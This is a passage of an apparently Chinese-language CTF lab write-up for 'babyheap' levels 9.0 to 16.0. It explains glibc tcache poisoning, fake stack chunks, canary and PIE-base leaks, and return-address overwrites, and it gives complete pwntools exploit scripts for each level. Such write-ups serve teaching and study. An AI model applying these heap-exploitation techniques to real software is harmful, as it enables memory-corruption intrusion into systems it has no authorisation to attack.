class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_level9.0&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;/challenge/babyheap_level9.0&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    size=<span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index,size = <span class="number">0</span></span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;You win! Here is your flag:\n&#x27;</span>)</span><br><span class="line">    flag = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    scanf(<span class="number">0</span>,p64(addr))</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x10</span>)          <span class="comment"># get fake_chunk out of tcache</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = puts(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x427C72</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_high = leak(secret_addr+8)       # no need to know secret_high which will be overwritten to zero by the next step</span></span><br><span class="line">leak(secret_addr)          <span class="comment"># secret_high will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line">leak(secret_addr - <span class="number">8</span>)      <span class="comment"># secret_low will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#secret was reset to 0 after 2 leak</span></span><br><span class="line">secret = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">send_flag(secret)</span><br></pre></td></tr></table></figure>



<h3 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h3><p>程序中有一个<code>win</code>函数，可以<code>ret2text</code></p>
<p>但是程序开启了<code>pie</code>保护，因此需要先泄露<code>pie base</code></p>
<p>允许堆栈上溢出构造假堆块，并<code>free</code>进入<code>tcache</code>, </p>
<p>由于栈上有<code>canary</code>并且溢出长度有限, 因此需要利用假堆块进行泄露或者篡改返回地址</p>
<blockquote>
<p>buffer视角:</p>
<table>
<thead>
<tr>
<th></th>
<th>offset</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td>低</td>
</tr>
<tr>
<td><strong>buffer</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td><strong>chunk_mem</strong></td>
<td><strong>+ 0x40</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>&#x3D;&#x3D;buffer_end&#x3D;&#x3D;</td>
<td>+ 0x7f</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x168</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody></table>
<p>堆块视角:</p>
<table>
<thead>
<tr>
<th>prev_size</th>
<th>- 0x10</th>
<th>低</th>
</tr>
</thead>
<tbody><tr>
<td>size</td>
<td>- 0x8</td>
<td></td>
</tr>
<tr>
<td><strong>chunkmem</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x58</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x128</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody></table>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usable_size = 0x130</span><br><span class="line">chunk_size = (0x130+0x10) | 1 = 0x141</span><br></pre></td></tr></table></figure>



<p>此时<code>chunkmem + 0x48</code>处是<code>main</code>栈帧中的<code>canary</code>所在地</p>
<p>此时<code>chunkmem + 0x58</code>处是<code>main</code>函数的返回地址, 正常情况下是<code>__libc_start_main+243 @ glibc</code>处</p>
<p>此时<code>chunkmem + 0x128</code>处是<code>__libc_start_main</code>函数返回地址, 正常情况下是<code>_start+46 @ babylevel14.0</code>处</p>
<p>正好两个地址一个可以泄露<code>libc_base</code>, 一个可以泄露<code>pie_base</code>, 当然, 本题中只需要泄露<code>pie_base</code></p>
<p>接下来就可以在<code>chunkmem</code>上溢出</p>
<p>综上</p>
<p>1.在堆栈上构造假堆块, 大小涵盖两个返回地址</p>
<p>2.下一次<code>malloc</code>拿到假堆块, 打印泄露<code>canary</code>和两个返回地址, 计算得到<code>pie_base</code></p>
<p>3.在假堆块上溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level14.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level14.0&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,n = <span class="number">6</span></span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(offset)</span><br><span class="line">  p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">  data = p.recv(n)</span><br><span class="line">  data = data[::-<span class="number">1</span>]</span><br><span class="line">  data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># data = int(data,16)</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_free</span>():</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_scanf</span>(<span class="params">content</span>):</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_scanf&#x27;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#1.堆栈溢出构造假堆块并释放，使之进入tcache</span></span><br><span class="line"></span><br><span class="line">usable_size = <span class="number">0x130</span></span><br><span class="line">chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>     <span class="comment">#1 means previous chunk is in use</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(chunk_size)</span><br><span class="line">stack_scanf(buffer)</span><br><span class="line">stack_free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.通过假堆块泄露返回地址上的值, 泄露canary</span></span><br><span class="line">canary_offset = <span class="number">0x48</span></span><br><span class="line">main_retaddr_offset = <span class="number">0x58</span></span><br><span class="line">__libc_start_main_retaddr_offset = <span class="number">0x128</span></span><br><span class="line">malloc(<span class="number">1</span>,usable_size)</span><br><span class="line">main_retaddr_value = echo(<span class="number">1</span>,main_retaddr_offset)</span><br><span class="line">__libc_start_main_retaddr_value = echo(<span class="number">1</span>,__libc_start_main_retaddr_offset)</span><br><span class="line">canary = echo(<span class="number">1</span>,canary_offset+<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">canary = canary &lt;&lt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">start_offset = <span class="number">0x13AE</span></span><br><span class="line">win_offset = <span class="number">0x1A22</span></span><br><span class="line">pie_base = __libc_start_main_retaddr_value - start_offset</span><br><span class="line">win_addr= pie_base + win_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_retaddr_offset)</span></span><br><span class="line"><span class="comment"># print(__libc_start_main_retaddr_offset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary = &quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.在假堆块上溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*canary_offset + p64(canary) </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(main_retaddr_offset - <span class="built_in">len</span>(payload)) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">scanf(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><p>buffer视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>buffer</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td>chunk_mem</td>
<td>+ 0x40</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x88</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x168</td>
<td></td>
</tr>
</tbody></table>
<p>假堆块视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
</tr>
</thead>
<tbody><tr>
<td>chunk_mem</td>
<td>0</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x58</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>overflow_limit</td>
<td>+ 0x7f</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x128</td>
</tr>
</tbody></table>
<p>值得注意的是win函数地址的最低字节是0x9写不进去?换成0x1D就可以了?</p>
<h3 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h3><p>只有堆块的增删改查业务</p>
<p>还是借助<code>echo</code>泄露堆栈地址, 然后在堆栈上构造假堆块,涵盖返回地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line">  _WORD stack_var[<span class="number">7</span>]; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)stack_var, <span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  argv = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *argv = (<span class="type">size_t</span>)<span class="string">&quot;/bin/echo&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = (<span class="type">size_t</span>)stack_var;</span><br></pre></td></tr></table></figure>

<p>每次<code>echo</code>都会有内存泄露, <code>argv</code>这个堆块不会被释放</p>
<p><code>argv[1]</code>保存了<code>echo</code>的一个局部变量的地址, 可以利用这一点泄露堆栈地址</p>
<blockquote>
<p>然而现在不能使用<code>UAF</code>, 因为在<code>main</code>中释放堆块时会立刻将堆块指针清零, 避免了<code>UAF</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;free&quot;</span>) )            <span class="comment">// free</span></span><br><span class="line">...</span><br><span class="line">      <span class="built_in">free</span>(chunks[index_1]);</span><br><span class="line">      chunks[index_1] = <span class="number">0LL</span>;                  <span class="comment">// 没有UAF</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是<code>main</code>中<code>read</code>有堆溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;read&quot;</span>) )                <span class="comment">// read</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">index_3 = atoi(input);</span><br><span class="line"><span class="keyword">if</span> ( index_3 &gt; <span class="number">0xF</span> )</span><br><span class="line">  __assert_fail(<span class="string">&quot;allocation_index &lt; 16&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x142</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">sizea = atoi(input);	<span class="comment">//越界写多少完全自己决定</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] read(0, allocations[%d], %d)\n&quot;</span>, index_3, sizea);</span><br><span class="line">read(<span class="number">0</span>, chunks[index_3], sizea);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br></pre></td></tr></table></figure>

<p>综上,整个利用过程:</p>
<p>0x1.首先<code>chunk1 = malloc(0x20)</code>,拿到一个堆块,那么第一次<code>echo</code>时申请的堆块A,就紧跟在<code>chunk1</code>后面高处,这是溢出的必要条件</p>
<p>0x2.第二次<code>echo</code>,以<code>chunk1</code>为基地址,泄露堆块<code>A+0x8</code>偏移处的堆栈地址,并根据相对距离计算得到<code>main</code>函数和<code>libc_start_main</code>函数的返回地址</p>
<p>0x3.利用堆溢出造成任意地址读,根据<code>libc_start_main</code>返回到<code>start</code>中的地址,计算得到<code>pie</code>基址,根据<code>win</code>的偏移量计算得到<code>win</code>的地址</p>
<p>0x4.利用堆溢出造成的任意地址写,修改<code>main</code>函数的返回地址为<code>win</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level15.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level15.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,size=<span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(offset)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)    </span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):				</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  data = echo(<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr,content</span>):</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  read(<span class="number">6</span>,<span class="number">6</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">echo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">data = echo(<span class="number">0</span>,<span class="number">0x38</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">stack_leak_addr = data</span><br><span class="line"></span><br><span class="line">main_ret = stack_leak_addr + <span class="number">0x176</span></span><br><span class="line">libc_start_main_ret = stack_leak_addr + <span class="number">0x246</span></span><br><span class="line"></span><br><span class="line">data = leak(libc_start_main_ret)    <span class="comment">#arbitrary read</span></span><br><span class="line">pie_base = data - <span class="number">0x142E</span></span><br><span class="line">win_addr = pie_base + <span class="number">0x1B00</span></span><br><span class="line"></span><br><span class="line">modify(main_ret,p64(win_addr))      <span class="comment">#arbitrary write</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level16-0"><a href="#level16-0" class="headerlink" title="level16.0"></a>level16.0</h3><p>level16.0中使用libc-2.35,此时next指针已经被保护起来</p>
<p>利用 <code>tcache数据结构与算法/glibc-2.38/exploit/[safe-linking]*</code>的思路</p>
